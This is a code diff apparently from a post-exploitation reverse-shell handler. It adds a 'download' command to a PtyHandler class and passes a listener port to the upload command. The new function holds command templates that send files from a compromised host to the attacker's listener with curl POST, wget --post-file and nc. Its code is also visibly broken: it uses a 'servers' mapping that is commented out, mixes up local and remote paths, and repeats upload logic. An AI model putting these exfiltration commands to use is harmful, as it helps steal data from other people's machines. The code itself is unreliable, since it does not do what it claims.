@@ -184,6 +184,118 @@ class PtyHandler:
         """ Exit command mode """
         self.enter_raw(save=False)
 
+    def do_download(self, argv):
+
+        uploaders = {
+            "curl": (
+                "http",
+                "curl -X POST --data @{remote_file} http://{lhost}:{lport}/{lfile}",
+            ),
+            "wget": (
+                "http",
+                "wget --post-file {remote_file} http://{lhost}:{lport}/{lfile}",
+            ),
+            "nc": ("raw", "nc {lhost} {lport} < {outfile}"),
+        }
+        # servers = {"http": util.receive_http_file, "raw": util.receive_raw_file}
+
+        parser = argparse.ArgumentParser(prog="upload")
+        parser.add_argument(
+            "--method",
+            "-m",
+            choices=uploaders.keys(),
+            default=None,
+            help="set the download method (default: auto)",
+        )
+        parser.add_argument(
+            "--output",
+            "-o",
+            default="./{basename}",
+            help="path to the output file (default: basename of input)",
+        )
+        parser.add_argument("path", help="path to the file to upload")
+
+        try:
+            args = parser.parse_args(argv)
+        except SystemExit:
+            # The arguments were parsed incorrectly, return.
+            return
+
+        if self.vars.get("lhost", None) is None:
+            util.error("[!] you must provide an lhost address for reverse connections!")
+            return
+
+        if args.method is not None and args.method not in self.known_binaries:
+            util.error(f"{args.method}: method unavailable")
+        elif args.method is not None:
+            method = uploaders[args.method]
+        else:
+            method = None
+            for m, info in uploaders.items():
+                if m in self.known_binaries:
+                    util.info("uploading via {m}")
+                    method = info
+                    break
+            else:
+                util.warn(
+                    "no available upload methods. falling back to dd/base64 method"
+                )
+
+        path = args.path
+        basename = os.path.basename(args.path)
+        name = basename
+        outfile = args.output.format(basename=basename)
+
+        # Get the remote file size
+        size = self.run(f'wc -c {shlex.quote(path)} 2>/dev/null || echo "none"')
+        if "none" in size:
+            util.error(f"{path}: no such file or directory")
+
+        with ProgressBar("downloading") as pb:
+
+            counter = pb(range(os.path.getsize(path)))
+            last_update = time.time()
+
+            def on_progress(copied, blocksz):
+                """ Update the progress bar """
+                counter.items_completed += blocksz
+                if counter.items_completed >= counter.total:
+                    counter.done = True
+                    counter.stopped = True
+                if (time.time() - last_update) > 0.1:
+                    pb.invalidate()
+
+            if method is not None:
+                server = servers[method[0]](path, name, progress=on_progress)
+
+                command = method[1].format(
+                    outfile=shlex.quote(outfile), lhost=self.vars["lhost"], lfile=name,
+                )
+
+                result = self.run(command, wait=False)
+            else:
+                server = None
+                with open(path, "rb") as fp:
+                    self.run(f"echo -n > {outfile}")
+                    copied = 0
+                    for chunk in iter(lambda: fp.read(8192), b""):
+                        encoded = base64.b64encode(chunk).decode("utf-8")
+                        self.run(f"echo -n {encoded} | base64 -d >> {outfile}")
+                        copied += len(chunk)
+                        on_progress(copied, len(chunk))
+
+            try:
+                while not counter.done:
+                    time.sleep(0.1)
+            except KeyboardInterrupt:
+                pass
+            finally:
+                if server is not None:
+                    server.shutdown()
+
+            # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
+            time.sleep(0.1)
+
     def do_upload(self, argv):
         """ Upload a file to the remote host """
 
@@ -263,7 +375,10 @@ class PtyHandler:
                 server = servers[method[0]](path, name, progress=on_progress)
 
                 command = method[1].format(
-                    outfile=shlex.quote(outfile), lhost=self.vars["lhost"], lfile=name,
+                    outfile=shlex.quote(outfile),
+                    lhost=self.vars["lhost"],
+                    lfile=name,
+                    lport=server.server_address[1],
                 )
 
                 result = self.run(command, wait=False)
